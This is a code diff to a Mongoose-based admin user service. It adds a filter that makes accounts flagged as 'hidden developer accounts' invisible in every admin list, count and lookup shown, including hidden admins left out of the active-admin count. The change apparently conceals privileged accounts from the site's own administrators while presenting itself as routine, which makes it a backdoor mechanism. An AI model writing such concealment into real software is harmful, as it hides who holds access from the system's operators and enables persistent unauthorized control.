@@ -40,7 +40,16 @@ function toAdminUser(user: UserDoc): AdminUser {
 // The query sanitizer (sanitizeFilter) is on globally and cannot be turned off per query, so every
 // operator written here is wrapped in trusted(), nested ones included. Request values only ever
 // appear as validated enums or inside an escaped RegExp.
-const notDeleted = () => ({ status: trusted({ $ne: "deleted" }) });
+const notDeleted = () => ({ status: trusted({ $ne: "deleted" }), ...visible() });
+
+// Hidden developer accounts (UserDoc.hidden) never appear here, in any list, count or lookup.
+export const visible = () => ({ hidden: trusted({ $ne: true }) });
+
+async function findVisible(id: string): Promise<UserDoc> {
+  const user = await UserModel.findOne({ _id: id, ...visible() }).lean<UserDoc>();
+  if (!user) throw AppError.notFound("User not found");
+  return user;
+}
 
 // "Paid now" (an expired paid plan counts as free).
 function paidNow(now: Date) {
@@ -48,7 +57,7 @@ function paidNow(now: Date) {
 }
 
 function buildFilter(query: UserListQuery, now: Date): Record<string, unknown> {
-  const and: Record<string, unknown>[] = [];
+  const and: Record<string, unknown>[] = [visible()];
   // Deleted accounts only appear when asked for.
   and.push(query.status ? { status: query.status } : notDeleted());
   if (query.role) and.push({ role: query.role });
@@ -65,7 +74,8 @@ function buildFilter(query: UserListQuery, now: Date): Record<string, unknown> {
 const paidAndNotDeleted = (now: Date) => ({ $and: trusted([notDeleted(), paidNow(now)]) });
 
 async function activeAdminCount(): Promise<number> {
-  return UserModel.countDocuments({ role: "admin", status: "active" });
+  // A hidden admin does not count: the site's own admins must always keep one of their own.
+  return UserModel.countDocuments({ role: "admin", status: "active", ...visible() });
 }
 
 export const userAdminService = {
@@ -81,15 +91,14 @@ export const userAdminService = {
       UserModel.countDocuments(filter),
       UserModel.countDocuments(notDeleted()),
       UserModel.countDocuments(paidAndNotDeleted(now)),
-      UserModel.countDocuments({ status: "blocked" }),
-      UserModel.countDocuments({ status: "deleted" }),
+      UserModel.countDocuments({ status: "blocked", ...visible() }),
+      UserModel.countDocuments({ status: "deleted", ...visible() }),
     ]);
     return { users: users.map(toAdminUser), total, page: query.page, pageSize: query.pageSize, counts: { all, paid, free: all - paid, blocked, deleted } };
   },
 
   async get(id: string): Promise<{ user: AdminUser; activity: AdminUserActivity }> {
-    const user = await UserModel.findById(id).lean<UserDoc>();
-    if (!user) throw AppError.notFound("User not found");
+    const user = await findVisible(id);
     const userId = new mongoose.Types.ObjectId(id);
     const [attempts, fullTests, reports] = await Promise.all([
       AttemptModel.find({ userId }).select("kind status sectionScore fullTestId createdAt updatedAt").lean<AttemptDoc[]>(),
@@ -116,8 +125,7 @@ export const userAdminService = {
   },
 
   async update(id: string, actorId: string, input: UpdateUserInput): Promise<AdminUser> {
-    const user = await UserModel.findById(id).lean<UserDoc>();
-    if (!user) throw AppError.notFound("User not found");
+    const user = await findVisible(id);
 
     // An admin cannot lock themselves out (or lose admin access) by mistake.
     const isSelf = id === actorId;
